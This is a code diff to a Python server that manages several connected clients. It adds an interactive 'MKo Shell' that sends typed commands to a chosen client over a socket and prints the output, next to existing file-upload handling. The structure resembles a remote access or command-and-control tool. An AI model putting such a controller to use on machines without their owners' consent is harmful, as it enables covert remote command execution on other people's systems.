@@ -95,6 +95,8 @@ def use_manger(thread_id, thread_to_conn, client_queues):
 
         if sub_command == "close":
             return "close"
+        elif sub_command == "shell":
+            return "shell"
 
 
 def upload_file(file_path, conn):
@@ -108,8 +110,30 @@ def upload_file(file_path, conn):
             percent = conn.recv(1024).decode('utf-8')
             # print(f"Pending", end="")
             # print(pending + "."*cpt, end="", flush=True)
-            print("\rPending (" + percent + "%)" + "."*cpt, end="", flush=True)
+            print("\rPending (" + percent + "%)" + "." * cpt, end="", flush=True)
             if cpt == 3:
                 cpt = 1
             else:
                 cpt += 1
+
+
+def interact_shell(conn, client_id):
+    print(f"MKo Shell (client {client_id}) > ", end="")
+    conn.send("shell".encode('utf-8'))
+
+    while True:
+        command = input()
+
+        if command.lower() == "exit":
+            conn.send(command.encode('utf-8'))
+            print(conn.recv(1024).decode('utf-8'))
+            break
+
+        if command.lower() == "":
+            continue
+
+        conn.send(command.encode('utf-8'))
+        output = conn.recv(1024).decode('utf-8')
+        print(output)
+
+        print(f"MKo Shell (client {client_id}) > ", end="")
